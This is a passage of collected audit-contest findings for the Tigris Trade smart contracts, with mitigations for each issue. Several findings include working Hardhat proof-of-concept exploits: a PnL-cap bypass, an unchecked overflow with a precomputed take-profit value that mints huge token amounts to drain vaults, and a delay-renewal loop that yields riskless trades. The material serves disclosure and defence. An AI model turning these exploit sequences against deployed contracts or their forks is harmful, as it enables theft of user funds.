balanceAfter.sub(balanceBefore).sub(marginAfterFee);       expect(profit.eq(parseEther("3960"))).to.be.true;      });      it.only("All profit is $9900, bypass the PnL check to take extra $2600 profit", async function () {       // We increase the possition first rather than closing the profit order directly       let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];       let extraMargin = parseEther("1000");       await trading.connect(owner).addToPosition(orderId, extraMargin, closePriceData, closeSig, StableVault.address, MockDAI.address, PermitData, owner.address);        // 60 secs later       await network.provider.send("evm_setNextBlockTimestamp", [2000001060]);       await network.provider.send("evm_mine");          // Now we close the order to take all profit       closePriceData = [node.address, 1, closePrice, 0, 2000001060, false];       let closeMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, closePrice, 0, 2000001060, false]         )       );       closeSig = await node.signMessage(         Buffer.from(closeMessage.substring(2), 'hex')       );        let balanceBefore = await stabletoken.balanceOf(owner.address);       await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);       let balanceAfter = await stabletoken.balanceOf(owner.address);       let marginAfterFee = parseEther("990").add(extraMargin.mul(990).div(1000));       let originalProfit = parseEther("3960");       let extraProfit = balanceAfter.sub(balanceBefore).sub(marginAfterFee).sub(originalProfit);       expect(extraProfit.gt(parseEther('2600'))).to.be.true;     });    }); });   ```  The test result ```  Design Specification: Maximum PnL is +500%     Bypass the maximum PnL check to take extra profit       √ All profit is $9900, close the order normally, only get $3960 profit       √ All profit is $9900, bypass the PnL check to take extra $2600 profit ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Add a check for ````addToPosition()```` function, revert if PnL >= 500%, enforce users to close the order to take a limited profit.
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L117   # Vulnerability details  ## Impact Some tokens (like USDT) do not work when changing the allowance from an existing non-zero allowance value.They must first be approved by zero and then the actual allowance must be approved.   ## Proof of Concept https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L117  ```solidity     function claimGovFees() public {         address[] memory assets = bondNFT.getAssets();          for (uint i=0; i < assets.length; i++) {             uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));             IGovNFT(govNFT).claim(assets[i]);             uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));             IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);// @audit this could fail always with some tokens,              bondNFT.distribute(assets[i], balanceAfter - balanceBefore);         }     } ```  ## Tools Used manual revision  ## Recommended Mitigation Steps    Add an approve(0) before approving; ```     function claimGovFees() public {         address[] memory assets = bondNFT.getAssets();          for (uint i=0; i < assets.length; i++) {             uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));             IGovNFT(govNFT).claim(assets[i]);             uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));             IERC20(assets[i]).approve(address(bondNFT), 0);             IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);             bondNFT.distribute(assets[i], balanceAfter - balanceBefore);         }   } ```      
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/chrisdior4-Q.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/utils/TradingLibrary.sol#L46   # Vulnerability details  # Certain fee configuration enables vaults to be drained  ### Summary An overflow in `TradingLibrary.pnl()` enables all funds from the vault contracts to be drained given a certain fee configuration is present.   ### Detailed exploit process description When opening a position, any value can be passed as take-profit price. This value is later used in the PNL calculation in an `unchecked` block. Setting this value specifically to attack the vault leads to the `Trading` contract minting a huge (in the example below `10^36`) Tigris tokens, which can then be given to the vault to withdraw assets.  The exploiter starts by setting himself as referrer, in order to later receive the referrer fees.  The next step is to open a short position at the current market price by calling `initiateLimitOrder()`. Here, the malicious value which will later bring the arithmetic to overflow is passed in as take-profit price. For the example below, the value has been calculated by hand to be `115792089237316195423570985008687907854269984665640564039467` for this specific market price, leverage and margin.  The order is then immediately executed through `executeLimitOrder()`. The final step is to close the order through `limitClose()`, which will then mint over `10^36` Tigris tokens to the attacker.   ### Detailed bug description The bug takes place in `TradingLibrary.pnl()`, line 46. The function is called during the process of closing the order to calculate the payout and position size. The malicious take-profit is passed as `_currentPrice` and the order's original opening price is passed as `_price`. The take-profit has been specifically calculated so that `1e18 * _currentPrice / _price - 1e18` results in `0`, meaning `_payout = _margin` (`accInterest` is negligible for this PoC). Line 48 then calculates the position size. Margin and leverage have been chosen so that `_initPositionSize * _currentPrice` does not overflow, resulting in a huge `_positionSize` which is returned from the function.  Later, `Trading._handleCloseFees()` is called, under the condition that `_payout > 0`, which is why the overflow had to be calculated so precisely, as to not subtract from the `_payout` but still create a large `_positionSize`. `_positionSize` is passed in to this function, and it is used to calculate DAO and referral fees. Line 805 is what requires the specific fee configuration to be present, as otherwise this line would revert. The fees have to be `daoFees = 2*referralFees` -- not exactly, but close to this relationship. Then line 792 will set the DAO fees close to zero, while the huge `referralFees` are directly minted and not included in the calculation in line 805.   ### Recommended mitigation The core issue is that the arithmetic in `TradingLibrary.pnl()` overflows. I recommend removing the `unchecked` block.    ### PoC Insert the following code as test into `test/07.Trading.js` and run it with `npx hardhat test test/07.Trading.js`: ```javascript describe("PoC", function () {     it.only("PoC", async function () {       // Setup token balances and approvals       const mockDAI = await ethers.getContractAt("MockERC20", MockDAI.address)       await mockDAI.connect(owner).transfer(user.address, parseEther("10000"))       await mockDAI.connect(user).approve(trading.address, parseEther("10000"))       const permitData = [         "0",         "0",         "0",         "0x0000000000000000000000000000000000000000000000000000000000000000",         "0x0000000000000000000000000000000000000000000000000000000000000000",         false       ]        // Create referral code       await referrals.connect(user).createReferralCode(ethers.constants.HashZero)        // Set the fees       await trading.connect(owner).setFees(         false,        // close         "200000000",  // dao           "0",          // burn         "100000000",  // referral         "0",          // bot         "0",          // percent       )         // ============================================================== //       // =================== Create the limit order =================== //       // ============================================================== //       const tradeInfo = [         parseEther("1"),          // margin amount         MockDAI.address,          // margin asset         StableVault.address,      // stable vault         parseEther("2"),          // leverage         0,                        // asset id         false,                    // direction (short)         "115792089237316195423570985008687907854269984665640564039467",          // take profit price         parseEther("0"),       // stop loss price         ethers.constants.HashZero // referral (ourself)       ];        // Create the order       await trading.connect(user).initiateLimitOrder(         tradeInfo,            // trade info         1,                    // order type (limit)         parseEther("1000"),   // price         permitData,           // permit         user.address          // trader       )         // ============================================================== //       // =================== Execute the limit order ================== //       // ============================================================== //        // Wait for some blocks to pass the delay       await network.provider.send("evm_increaseTime", [10])       await network.provider.send("evm_mine")        // Create the price data       let priceData = [         node.address,                                   // provider         0,                                              // asset id         parseEther("1000"),                             // price         10000000,                                       // spread (0.1%)         (await ethers.provider.getBlock()).timestamp,   // timestamp         false                                           // is closed       ]        // Sign the price data       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       )        // Execute the limit order       await trading.connect(user).executeLimitOrder(1, priceData, sig);            // ============================================================== //       // ======================== Close order  ======================== //       // ============================================================== //        // Wait for some blocks to pass the delay       await network.provider.send("evm_increaseTime", [10])       await network.provider.send("evm_mine")        // Close order       await trading.connect(user).limitClose(         1,          // id         true,       // take profit         priceData,  // price data         sig,        // signature       )        // Print results       const amount = await stabletoken.balanceOf(user.address)       const tenPow18 = "1000000000000000000"       console.log(`StableToken balance at end: ${(amount / tenPow18).toString()}`)     }) }) ```
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215   # Vulnerability details  ## Impact When calling `Lock.claimGovFees` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110)), assets that are set to be not allowed or assets that don't have any shares yet in the `BondNFT` contract will cause a silent failure in `BondNFT.distribute` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215)).   The funds from the `GovNFT` contract will get transferred into the `Lock` contract and then will be stuck there. They cannot be recovered.    ## Proof of Concept 1. An asset is added to the `BondNFT` contract by calling `BondNFT.addAsset` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L349](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L349)) 2. There are no bonds yet for this asset so the amount of shares for the asset is zero 3. `Lock.claimGovFees` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110)) is called 4. Funds are transferred from the `GovNFT` contract to the `Lock` contract ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L115](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L115)) 5. The call to `BondNFT.distribute` now fails quietly without reverting the transaction:      ```solidity     if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;    ``` 6. The funds are now stuck in the `Lock` contract. They cannot be recovered.  ## Tools Used VSCode  ## Recommended Mitigation Steps A naive solution would be to use `revert` instead of `return` in `BondNFT.distribute` such that funds are either transferred from `GovNFT` to `Lock` and then to `BondNFT` or not at all.    ```solidity      ) external { -        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return; +        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) revert;          IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);          unchecked {              uint aEpoch = block.timestamp / DAY; ```  This however is an incomplete fix because if there is a single "bad" asset, rewards for the other assets cannot be distributed either.    Moreover functions like `Lock.lock` and `Lock.release` rely on `Lock.claimGovFees` to not revert.    So you might allow the owner to rescue stuck tokens from the `Lock` contract. Of course only allow rescuing the balance of the `Lock` contract minus the `totalLocked` of the asset in the `Lock` contract such that the locked amount cannot be rescued.  
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L573   # Vulnerability details  # Riskless trades due to delay check  ### Summary `Trading.limitClose()` uses `_checkDelay()`. This allows for riskless trades, by capturing price rises through increasing the stop-loss, while preventing the underwater position to be closed in case of the price dropping by continuously increasing the delay.   ### Detailed description A malicious trader can exploit the `Trading` contract to achieve riskless trades. In the worst-case scenario, the trader can always close the trade break-even, while in a good scenario the trader captures all upside price movement.  The exploit is based on three principles: 1. The stop-loss of a position can be updated without any delay checks, due to `_checkDelay()` not being called in `updateTpSl()` 2. Positions can only be closed by MEV bots or other third parties after the block delay has been passed due to `limitClose` calling `_checkDelay()` 3. The block delay can be continuously renewed for a negligible cost  **Based on these three principles, the following method can be used to perform riskless trades:** Assuming a current market price of 1,000 DAI, begin by opening a long limit order through `initiateLimitOrder()` at the current market price of 1,000 DAI and stop-loss at the exact market price of 1,000 DAI. Then immediately execute the limit order through `executeLimitOrder`.  After the block delay has passed, MEV bots or other third parties interested in receiving a percentage reward for closing the order would call `limitClose`. However, we can prevent them from doing so by continuously calling `addToPosition` with 1 wei when the block delay comes close to running out *[1]*, which will renew the delay and thus stops `limitClose` from being called.  While the trader keeps renewing the delay to stop his position from being closed, he watches the price development: - If the price goes **down**, the trader will not make any loss, since he still has his original stop-loss set. He just has to make sure that the price does not drop too far to be liquidated through `liquidatePosition()`. If the price comes close to the liquidation zone, he stops renewing the delay and closes the position break-even for the initial stop-loss price even though the price is down significantly further. He can also choose to do that at any other point in time if he decides the price is unlikely to move upward again. - If the price goes **up**, the trader calls `updateTpSl()` to lock in the increased price. For example, if the price moves from 1,000 DAI to 2,000 DAI, he calls `updateTpSl()` with 2,000 DAI as stop-loss. Even if the price drops below 2,000 DAI again, the stop-loss is stored. This function can be called while the delay is still in place because there is no call to `_checkDelay()`.  The trader keeps calling `updateTpSl()` when the price reaches a new high since he opened the position initially to capture all upside movement. When he decides that the price has moved high enough, he finally lets the delay run out and calls `limitClose()` to close the order at the peak stop-loss.   *Notes* *[1]*: Tigris Trade also plans to use L2s such as Arbitrum where there is one block per transaction. This could bring up the false impression that the trader would have to make lots of calls to `addToPosition` after every few transactions on the chain. However, `block.number`, which is used by the contract, actually returns the L1 block number and not the L2 block number.  ### Recommended mitigation The core issue is that the position cannot be closed even if it is below the stop-loss due to constantly renewing the delay. The delay checking in `limitClose()` should be modified to also consider whether the position is below the stop-loss.    ### PoC Insert the following code as test into `test/07.Trading.js` and run it with `npx hardhat test test/07.Trading.js`: ```javascript describe("PoC", function () {     it.only("PoC", async function () {       // Setup token balances and approvals       const mockDAI = await ethers.getContractAt("MockERC20", MockDAI.address)       await mockDAI.connect(owner).transfer(user.address, parseEther("10000"))       await mockDAI.connect(owner).transfer(stablevault.address, parseEther("100000"))       await mockDAI.connect(user).approve(trading.address, parseEther("10000"))       const daiAtBeginning = await mockDAI.balanceOf(user.address)       const permitData = [         "0",         "0",         "0",         "0x0000000000000000000000000000000000000000000000000000000000000000",         "0x0000000000000000000000000000000000000000000000000000000000000000",         false       ]        // Setup block delay to 5 blocks       const blockDelay = 5;       await trading.connect(owner).setBlockDelay(blockDelay)           // ============================================================== //       // =================== Create the limit order =================== //       // ============================================================== //       const tradeInfo = [         parseEther("9000"),       // margin amount         MockDAI.address,          // margin asset         StableVault.address,      // stable vault         parseEther("2"),          // leverage         0,                        // asset id         true,                     // direction (long)         parseEther("0"),          // take profit price         parseEther("1000"),       // stop loss price         ethers.constants.HashZero // referral       ];        // Create the order       await trading.connect(user).initiateLimitOrder(         tradeInfo,            // trade info         1,                    // order type (limit)         parseEther("1000"),   // price         permitData,           // permit         user.address          // trader       )          // ============================================================== //       // =================== Execute the limit order ================== //       // ============================================================== //        // Wait for some blocks to pass the delay       await network.provider.send("evm_increaseTime", [10])       for (let n = 0; n < blockDelay; n++) {         await network.provider.send("evm_mine")       }        // Create the price data (the price hasn't changed)       let priceData = [         node.address,                                   // provider         0,                                              // asset id         parseEther("1000"),                             // price         10000000,                                       // spread (0.1%)         (await ethers.provider.getBlock()).timestamp,   // timestamp         false                                           // is closed       ]        // Sign the price data       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       )        // Execute the limit order       await trading.connect(user).executeLimitOrder(1, priceData, sig);             // ============================================================== //       // ================== Block bots from closing =================== //       // ============================================================== //        for (let i = 0; i < 5; i++) {          /*           This loop demonstrates blocking bots from closing the position even if the price falls below the stop loss.           We constantly add 1 wei to the position when the delay is close to running out.           This won't change anything about our position, but it will reset the delay timer,           stopping bots from calling `limitClose()`.             This means that if the price drops, we can keep our position open with the higher stop loss, avoiding any losses.           And if the price rises, we can push the stop loss higher to keep profits.            The loop runs five times just to demonstrate. In reality, this could be done as long as needed.         */           // Blocks advanced to one block before the delay would pass         await network.provider.send("evm_increaseTime", [10])         for (let n = 0; n < blockDelay - 1; n++) {           await network.provider.send("evm_mine")         }             // ============================================================== //         // =========== Add 1 wei to position (price is down)  =========== //         // ============================================================== //          // Increase delay by calling addToPosition with 1 wei         // Create the price data         priceData = [           node.address,                                   // provider           0,                                              // asset id           parseEther("900"),                              // price           10000000,                                       // spread (0.1%)           (await ethers.provider.getBlock()).timestamp,   // timestamp           false                                           // is closed         ]          // Sign the price data -          message = ethers.utils.keccak256(           ethers.utils.defaultAbiCoder.encode(             ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],             [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]           )         );         sig = await node.signMessage(           Buffer.from(message.substring(2), 'hex')         )          // Add to position         await trading.connect(user).addToPosition(           1,           "1",           priceData,           sig,           stablevault.address,           MockDAI.address,           permitData,           user.address,         )            // ============================================================== //         // ====================== Bots cannot close ===================== //         // ============================================================== //          // Bots cannot close the position even if the price is down below the stop loss         await expect(trading.connect(user).limitClose(           1,          // id           false,      // take profit           priceData,  // price data           sig,        // signature         )).to.be.revertedWith("0") // checkDelay          // They can also not liquidate the position because the price is not down enough         // If the price falls close to the liquidation zone, we can add more margin or simply close         // the position, netting us the stop-loss price.         await expect(trading.connect(user).liquidatePosition(           1,          // id           priceData,  // price data           sig,        // signature         )).to.be.reverted             // ============================================================== //         // =============== Increase SL when price is up  ================ //         // ============================================================== //          // Sign the price data (price has 5x'ed from initial price)         priceData = [           node.address,                                   // provider           0,                                              // asset id           parseEther("5000"),                             // price           10000000,                                       // spread (0.1%)           (await ethers.provider.getBlock()).timestamp,   // timestamp           false                                           // is closed         ]         message = ethers.utils.keccak256(           ethers.utils.defaultAbiCoder.encode(             ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],             [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]           )         );         sig = await node.signMessage(           Buffer.from(message.substring(2), 'hex')         )          // Update stop loss right at the current price         await trading.connect(user).updateTpSl(           false,                // type (sl)           1,                    // id           parseEther("5000"),   // sl price           priceData,            // price data           sig,                  // signature           user.address,        // trader         )       }            // ============================================================== //       // ======================== Close order  ======================== //       // ============================================================== //        // When we are happy with the profit, we stop increasing the delay and close the position        // Wait for some blocks to pass the delay       await network.provider.send("evm_increaseTime", [10])       for (let n = 0; n < blockDelay; n++) {         await network.provider.send("evm_mine")       }        // Close order       await trading.connect(user).limitClose(         1,          // id         false,      // take profit         priceData,  // price data         sig,        // signature       )        // Withdraw to DAI       const amount = await stabletoken.balanceOf(user.address)       await stablevault.connect(user).withdraw(MockDAI.address, amount)        // Print results       const daiAtEnd = await mockDAI.balanceOf(user.address)       const tenPow18 = "1000000000000000000"       const diff = (daiAtEnd - daiAtBeginning).toString() / tenPow18       console.log(`Profit: ${diff} DAI`)     }) }) ```
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105   # Vulnerability details  ## Impact The `Lock` contract ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10)) allows end-users to interact with bonds.    There are two functions that allow to lock some amount of assets. The first function is `Lock.lock` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76)) which creates a new bond. The second function is `Lock.extendLock` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92)). This function extends the lock for some `_period` and / or increases the locked amount by some `_amount`.    The issue is that the `Lock.extendLock` function does not increase the value in `totalLocked[_asset]`. This however is necessary because `totalLocked[_asset]` is reduced when `Lock.release` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105)) is called.    Therefore only the amount of assets deposited via `Lock.lock` can be released again. The amount of assets deposited using `Lock.extendLock` can never be released again because reducing `totalLocked[_asset]` will cause a revert due to underflow.    So the amount of assets deposited using `Lock.extendLock` is lost.    ## Proof of Concept 1. User A calls `Lock.lock` to lock a certain `_amount` (amount1) of `_asset` for a certain `_period`. 2. User A calls then `Lock.extendLock` and increases the locked amount of the bond by some amount2 3. User A waits until the bond has expired 4. User A calls `Lock.release`. This function calculates `totalLocked[asset] -= lockAmount;`. Which will cause a revert because the value of `totalLocked[asset]` is only amount1  You can add the following test to the `Bonds` test in `Bonds.js`:   ```javascript describe("ReleaseUnderflow", function () {     it("release can cause underflow", async function () {         await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther("110"));         // Lock 100 for 9 days         await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther("100"), 9);          await bond.connect(owner).setManager(lock.address);          await stabletoken.connect(user).approve(lock.address, ethers.utils.parseEther("10"));          // Lock another 10         await lock.connect(user).extendLock(1, ethers.utils.parseEther("10"), 0);          await network.provider.send("evm_increaseTime", [864000]); // Skip 10 days         await network.provider.send("evm_mine");          // Try to release 110 after bond has expired -> Underflow         await lock.connect(user).release(1);     }); }); ``` Run it with `npx hardhat test --grep "release can cause underflow"`.   You can see that it fails because it causes an underflow.    ## Tools Used VSCode  ## Recommended Mitigation Steps Add `totalLocked[_asset] += amount` to the `Lock.extendLock` function.  
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/Deekshith99-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/Deivitto-Q.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L275-L282   # Vulnerability details  ## Impact When adding to a position, the amount of margin pulled from the user is not as much as it should be, which leaks value from the protocol and lowering the collateralization ratio of `tigAsset`.  ## Proof of Concept In `Trading.addToPosition` the `_handleDeposit` function is called like this:  ```js _handleDeposit(     _trade.tigAsset,     _marginAsset,     _addMargin - _fee,     _stableVault,     _permitData,     _trader ); ```  The third parameter with the value of `_addMargin - _fee` is the amount pulled (or burned in the case of using `tigAsset`) from the user. The `_fee` value is calculated as part of the position size like this:   ```js uint _fee = _handleOpenFees(_trade.asset, _addMargin*_trade.leverage/1e18, _trader, _trade.tigAsset, false); ```  The `_handleOpenFees` function mints `_tigAsset` to the referrer, to the `msg.sender` (if called by a function meant to be executed by bots) and to the protocol itself. Those minted tokens are supposed to be part of the `_addMargin` value paid by the user. Hence using `_addMargin - _fee` as the third parameter to `_handleDeposit` is going to pull or burn less margin than what was accounted for.  An example for correct usage can be seen in `initiateMarketOrder`:  ```js uint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false); uint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18; _handleDeposit(_tigAsset, _tradeInfo.marginAsset, _tradeInfo.margin, _tradeInfo.stableVault, _permitData, _trader); ```  Here the third parameter to `_handleDeposit` is not `_marginAfterFees` but `_tradeInfo.margin` which is what the user has input and is supposed to pay.   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  In `Trading.addToPosition` call the `_handleDeposit` function without subtracting the `_fee` value:  ```js _handleDeposit(     _trade.tigAsset,     _marginAsset,     _addMargin,     _stableVault,     _permitData,     _trader ); ```
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/rbserver-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/brgltd-Q.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L91-L122   # Vulnerability details  ## Impact As mentioned by https://docs.tigris.trade/protocol/oracle, "Prices provided by the oracle network are also compared to Chainlink's public price feeds for additional security. If prices have more than a 2% difference the transaction is reverted." The Chainlink price verification logic in the following `TradingLibrary.verifyPrice` function serves this purpose. However, besides that `IPrice(_chainlinkFeed).latestAnswer()` uses Chainlink's deprecated `latestAnswer` function, this function also does not guarantee that the price returned by the Chainlink price feed is not stale. When `assetChainlinkPriceInt != 0` is `true`, it is still possible that `assetChainlinkPriceInt` is stale in which the Chainlink price verification would compare the off-chain price against a stale price returned by the Chainlink price feed. For a off-chain price that has more than a 2% difference when comparing to a more current price returned by the Chainlink price feed, this off-chain price can be incorrectly considered to have less than a 2% difference when comparing to a stale price returned by the Chainlink price feed. As a result, a trading transaction that should revert can go through, which makes the price verification much less secure.  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L91-L122 ```solidity     function verifyPrice(         uint256 _validSignatureTimer,         uint256 _asset,         bool _chainlinkEnabled,         address _chainlinkFeed,         PriceData calldata _priceData,         bytes calldata _signature,         mapping(address => bool) storage _isNode     )         external view     {         ...         if (_chainlinkEnabled && _chainlinkFeed != address(0)) {             int256 assetChainlinkPriceInt = IPrice(_chainlinkFeed).latestAnswer();             if (assetChainlinkPriceInt != 0) {                 uint256 assetChainlinkPrice = uint256(assetChainlinkPriceInt) * 10**(18 - IPrice(_chainlinkFeed).decimals());                 require(                     _priceData.price < assetChainlinkPrice+assetChainlinkPrice*2/100 &&                     _priceData.price > assetChainlinkPrice-assetChainlinkPrice*2/100, "!chainlinkPrice"                 );             }         }     } ```  Based on https://docs.chain.link/docs/historical-price-data, the followings can be done to avoid using a stale price returned by the Chainlink price feed. 1. The `latestRoundData` function can be used instead of the deprecated `latestAnswer` function. 2. `roundId` and `answeredInRound` are also returned. "You can check `answeredInRound` against the current `roundId`. If `answeredInRound` is less than `roundId`, the answer is being carried over. If `answeredInRound` is equal to `roundId`, then the answer is fresh." 3. "A read can revert if the caller is requesting the details of a round that was invalid or has not yet been answered. If you are deriving a round ID without having observed it before, the round might not be complete. To check the round, validate that the timestamp on that round is not 0."  ## Proof of Concept The following steps can occur for the described scenario. 1. Alice calls the `Trading.initiateMarketOrder` function, which eventually calls the `TradingLibrary.verifyPrice` function, to initiate a market order. 2. When the `TradingLibrary.verifyPrice` function is called, the off-chain price is compared to the price returned by the Chainlink price feed for the position asset. 3. The price returned by the Chainlink price feed is stale, and the off-chain price has less than a 2% difference when comparing to this stale price. 4. Alice's `Trading.initiateMarketOrder` transaction goes through. However, this transaction should revert because the off-chain price has more than a 2% difference if comparing to a more current price returned by the Chainlink price feed.  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L113 can be updated to the following code. ```solidity             (uint80 roundId, int256 assetChainlinkPriceInt, , uint256 updatedAt, uint80 answeredInRound) = IPrice(_chainlinkFeed).latestRoundData();             require(answeredInRound >= roundId, "price is stale");             require(updatedAt > 0, "round is incomplete"); ```
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750 https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810 https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294   # Vulnerability details  ## Impact Calling the following `Trading._handleOpenFees` function does not approve the `GovNFT` contract for spending any of the `Trading` contract's `_tigAsset` balance, which is unlike calling the `Trading._handleCloseFees` function below that executes `IStable(_tigAsset).approve(address(gov), type(uint).max)`. Due to this lack of approval, when calling the `Trading._handleOpenFees` function without the `Trading._handleCloseFees` function being called for the same `_tigAsset` beforehand, the `GovNFT.distribute` function's execution of `IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount)` in the `try...catch...` block will not transfer any `_tigAsset` amount as the trade's DAO fees to the `GovNFT` contract. In this case, although the Governance NFT holder, whose NFT was minted before the `Trading._handleOpenFees` function is called, deserves the rewards from the DAO fees generated by the trade, this holder does not have any pending rewards after such `Trading._handleOpenFees` function call because none of the DAO fees were transferred to the `GovNFT` contract. Hence, this Governance NFT holder loses the rewards that she or he is entitled to.  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750 ```solidity     function _handleOpenFees(         uint _asset,         uint _positionSize,         address _trader,         address _tigAsset,         bool _isBot     )         internal         returns (uint _feePaid)     {         ...         unchecked {             uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT;             ...             IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);         }         gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));     } ```  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810 ```solidity     function _handleCloseFees(         uint _asset,         uint _payout,         address _tigAsset,         uint _positionSize,         address _trader,         bool _isBot     )         internal         returns (uint payout_)     {         ...         IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);         IStable(_tigAsset).approve(address(gov), type(uint).max);         gov.distribute(_tigAsset, _daoFeesPaid);         return payout_;     } ```  